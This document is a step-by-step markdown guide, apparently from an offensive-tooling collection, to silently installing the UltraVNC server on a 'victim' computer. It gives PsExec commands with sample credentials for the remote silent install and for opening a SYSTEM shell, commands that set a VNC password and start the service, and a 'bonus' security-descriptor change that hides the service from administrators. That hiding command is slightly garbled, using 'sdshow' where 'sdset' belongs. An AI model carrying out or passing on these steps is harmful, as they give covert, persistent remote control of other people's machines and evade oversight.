# VNC (UltraVNC) Remote Desktop Connectin Server/Client

UltraVNC is an open-source remote-administration/remote-desktop-software utility. The client supports Microsoft Windows and Linux but the server only supports Windows. It uses the VNC protocol to control/access another computer remotely over a network connection.

![UltraVNC](assets/uvnc.jpg "Open source UltraVNC remote desktop client/server")

## Install VNC Server to Victim Computer

You can remotely view, control or transfer files the victim computer using the UltraVNC tool. For this, follow the steps below.

### Step 1: Download UltraVNC setup

Download ultravnc to your computer as **"c:\\uvncsetup.exe"**.

### Step 2: Start installation 

To silently install ultravnc on victim computer run **"uvncsetup.exe"** as remotely using **PsExec.exe**. Below command runs executable (uvncsetup.exe) on the remote system:

`psexec \\victim -u Default -p admin0 -h -i -c C:\uvncsetup.exe /SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /FORCECLOSEAPPLICATIONS /LOGCLOSEAPPLICATIONS /RESTARTAPPLICATIONS /NOICONS /FIREWALL /NOVIEW /COMPONENTS="ultravnc_server" /TASKS="installservice,stopservice" /DIR="%programfiles%\uvnc"`

Note: The inno setup parameters above allow the installation to complete silently. The installation files will be saved in the **"%program files%\uvnc"** directory on victim computer.



### Step 3: Set ultravnc password

To define new ultravnc password and restart ultravnc_service on victim first open an interactive shell to victim computer.

`psexec \\victim -u Default -p admin0 -h -s -i cmd.exe`

And runs commands below. First command creates **ultravnc.ini** file with the password 'admin0' at  **"%programfiles%\uvnc"** on victim computer. Second command restart the ultra vnc service to take affect new password.

`(echo [ultravnc] & echo passwd=56B6ACA18D1BA76008 & echo passwd2=56B6ACA18D1BA76008) > "%programfiles%\uvnc\ultravnc.ini"`
`net start uvnc_service`

### Step 5: Check the installation

If you want to check UltraVNC listen port and running process:

`netstat -ano | find "5900"`\
`tasklist /fi "pid eq <pid>"`

Run UltraVNC viewer and connect to victim computer. You can control it with mouse/keyboard or download/upload files via UltraVNC's  file manager.

![UltraVNC Viewer](assets/uvnc_viewer.png "UltraVNC Viewer")

### Bonus Step: Hide UltraVNC

To hide the service uvnc_service from Service Manager GUI run below:

`sc sdshow uvnc_service "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"`

To show it again run below:

`sc sdset uvnc_service "D:(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)(A;;CC;;;AC)(A;;CC;;;S-1-15-3-1024-528118966-3876874398-709513571-1907873084-3598227634-3698730060-278077788-3990600205)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)"`

